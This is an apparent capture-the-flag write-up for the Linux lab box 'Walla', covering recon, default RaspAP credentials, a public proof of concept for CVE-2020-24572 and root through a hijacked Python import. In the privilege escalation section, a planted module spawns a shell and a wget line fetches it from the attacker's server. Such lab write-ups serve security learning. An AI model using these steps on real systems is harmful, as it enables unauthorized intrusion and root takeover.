# Walla
**OS:** Linux **Difficulty:** Intermediate **Date completed:** 2026-06-15 **Tags:** #raspap #cve-2020-24572 #python-module-hijacking #sudo-misconfig

---

## Summary

Walla is an intermediate Linux box centered on RaspAP, a Wi-Fi access point management web app. An authenticated RCE in RaspAP's web console gives an initial foothold as `www-data`. Root is obtained by abusing a `sudo`-permitted Python script that imports a module which doesn't exist anywhere on disk, allowing a malicious module to be planted and executed with elevated privileges.

---

## Reconnaissance

### Nmap

```bash
nmap -p- -A -T4 192.168.230.98 --open
```

```
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Not valid before: 2020-09-17T18:26:36
|_Not valid after:  2030-09-15T18:26:36
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
8091/tcp  open  http       lighttpd 1.4.53
|_http-server-header: lighttpd/1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
```

**Key findings:**

| Port           | Service    | Version         | Notes |
| -------------- | ---------- | --------------- | ----- |
| 22, 422, 42042 | ssh        |                 |       |
| 23             | telnet     | linux telnetd   |       |
| 25             | smtp       | Postfix         |       |
| 53             | tcpwrapped |                 |       |
| 8091           | HTTP       | lighttpd 1.4.53 |       |

- Port 8091: web app, primary target. `Basic realm=RaspAP` exposes the application behind a login prompt.
- Port 23: check for banner information, default credentials
- Port 25: user enumeration, version vulnerabilities
- Port 53: TCP connection restricted; could try a UDP scan
- Port 22, 422, 42042: standard, revisit if credentials are found

---

## Enumeration

- Telnet does not allow anonymous login. `Linux Telnetd 0.17` may have exploits available, but nothing panned out here, parked as a dead end.
- SMTP allows user enumeration via VRFY, returning a large list of valid system accounts. None of these led anywhere further (no reused credentials, no obvious pivot), so this was also a dead end for this box.
- Port 8091 (RaspAP) the default credentials `admin`:`secret` work, giving access to the console and revealing the running version, RaspAP v2.5.

```bash
$ telnet 192.168.183.97 23
Trying 192.168.183.97...
Connected to 192.168.183.97.
Escape character is '^]'.
Linux Telnetd 0.17
Debian GNU/Linux 10
walla login: admin
Password: 

Login incorrect
walla login: root

Login incorrect
walla login: Connection closed by foreign host.
```

```
$ smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.183.97

...
192.168.183.97: _apt exists
192.168.183.97: avahi exists
192.168.183.97: backup exists
192.168.183.97: bin exists
192.168.183.97: colord exists
192.168.183.97: daemon exists
192.168.183.97: dnsmasq exists
192.168.183.97: games exists
192.168.183.97: gnats exists
192.168.183.97: hplip exists
192.168.183.97: irc exists
192.168.183.97: list exists
192.168.183.97: lp exists
192.168.183.97: mail exists
192.168.183.97: man exists
192.168.183.97: messagebus exists
192.168.183.97: news exists
192.168.183.97: nobody exists
192.168.183.97: postfix exists
192.168.183.97: postmaster exists
192.168.183.97: proxy exists
192.168.183.97: root exists
192.168.183.97: ROOT exists
192.168.183.97: saned exists
192.168.183.97: sshd exists
192.168.183.97: sync exists
192.168.183.97: sys exists
192.168.183.97: systemd-coredump exists
192.168.183.97: systemd-network exists
192.168.183.97: systemd-timesync exists
192.168.183.97: systemd-resolve exists
192.168.183.97: uucp exists
192.168.183.97: www-data exists
```

<img width="1339" height="751" alt="image" src="https://github.com/user-attachments/assets/c4ff0ab7-492b-4627-be7a-e9f181e4efc0" />


<img width="1339" height="756" alt="image" src="https://github.com/user-attachments/assets/35fb8d86-579f-437c-ba53-13d6b80b459b" />



---

## Initial Foothold

RaspAP version 2.5 contains a known authenticated remote code execution vulnerability, documented as [CVE-2020-24572](https://nvd.nist.gov/vuln/detail/CVE-2020-24572). The flaw exists within the web console component.

```bash
git clone https://github.com/gerbsec/CVE-2020-24572-POC
cd CVE-2020-24572-POC/
```

<img width="660" height="207" alt="image" src="https://github.com/user-attachments/assets/8430efd1-57ab-46f7-b85e-1e93c6747a67" />


**Result:** shell as `www-data`

---

## Privilege Escalation

Checking `sudo -l` first, as usual:

<img width="666" height="259" alt="image" src="https://github.com/user-attachments/assets/e423b004-1751-46c1-8ec0-3ae84e93377e" />


`ifup` (also listed) has no exploitable entries on GTFOBins.

Looking into `wifi_reset.py`

<img width="663" height="253" alt="image" src="https://github.com/user-attachments/assets/1551d00b-76ea-48b0-bda2-e5a014302380" />


It seems that the script would try to import the wificontroller module.

There a few options, we can look at whether our user has permissions to edit the file, if so we can edit the file to put in a payload and execute with elevated privileges. If we do not have permissions, we can see if we can modify the module that is being imported.

We notice that there is no wificontroller module, which allows us to create one.

```
echo 'import os; os.system("/bin/bash")' > wificontroller.py
```

<img width="649" height="88" alt="image" src="https://github.com/user-attachments/assets/53fc19ca-fabf-4b4c-8cf3-14b6d7cb8905" />


We import this module onto the victim machine, execute the script and get a shell.

```
python3 -m http.server 80

wget http://192.168.x.x/wificontroller.py
```

<img width="655" height="66" alt="image" src="https://github.com/user-attachments/assets/c2511edb-3139-4907-8a0d-78dbc72bf111" />


**Result:** shell as `root`

---

## Lessons Learned

- Default credentials are always worth trying first on any authenticated web panel
- When a `sudo`-permitted script imports a module, always check whether that module actually exists on disk

---

## References

- [CVE-2020-24572](https://nvd.nist.gov/vuln/detail/CVE-2020-24572) (RaspAP authenticated RCE vulnerability)
- [CVE-2020-24572-POC](https://github.com/gerbsec/CVE-2020-24572-POC) (exploit used for initial foothold)
- [GTFOBins - ifup](https://gtfobins.github.io/gtfobins/ifup/) (checked during privesc enumeration, no viable entry for this box)

